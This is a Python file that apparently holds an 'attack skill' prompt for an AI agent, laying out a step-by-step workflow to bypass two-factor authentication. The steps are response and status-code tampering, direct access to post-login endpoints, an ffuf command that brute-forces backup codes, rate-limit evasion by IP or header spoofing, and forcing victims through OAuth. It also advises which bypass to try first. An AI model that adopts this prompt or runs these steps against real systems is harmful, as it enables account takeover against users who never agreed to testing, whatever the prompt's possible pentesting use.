"""
2FA / MFA Bypass Attack Skill Prompt.
"""

TWOFA_BYPASS_SKILL_PROMPT = """
## ATTACK SKILL: 2FA / MFA BYPASS

### MANDATORY WORKFLOW

#### STEP 1: RESPONSE MANIPULATION
After entering valid credentials:
```
HTTP/1.1 200 OK  ->  Change to: HTTP/1.1 200 OK
{"2fa_required": true}  ->  {"2fa_required": false}
{"verified": false}  ->  {"verified": true}
```

#### STEP 2: STATUS CODE TAMPERING
```
POST /login  ->  302 Found (redirect to 2FA page)  ->  Change response to 200 OK or follow redirect
```

#### STEP 3: DIRECT ENDPOINT ACCESS
Skip 2FA entirely by accessing post-auth endpoints directly:
```
/account, /dashboard, /settings, /api/user, /profile
```
-> Some apps set session cookie after password but before 2FA.

#### STEP 4: BACKUP CODE BRUTE-FORCE
Backup codes are often short (6-8 digits) and may lack rate limiting:
```bash
seq -w 000000 999999 | ffuf -u https://TARGET/2fa/backup -d 'code=FUZZ' -fc 401
```

#### STEP 5: RATE-LIMIT RESET
Change IP (VPN/proxy), clear cookies, or add X-Forwarded-For header to reset failed attempt counter.

#### STEP 6: OAuth/SSO BYPASS
If OAuth login bypasses 2FA: force victim through OAuth flow instead of direct login.

#### ANTI-PATTERNS: Test direct endpoint access FIRST — it's the fastest bypass. Don't just brute-force backup codes — test response manipulation first.
"""
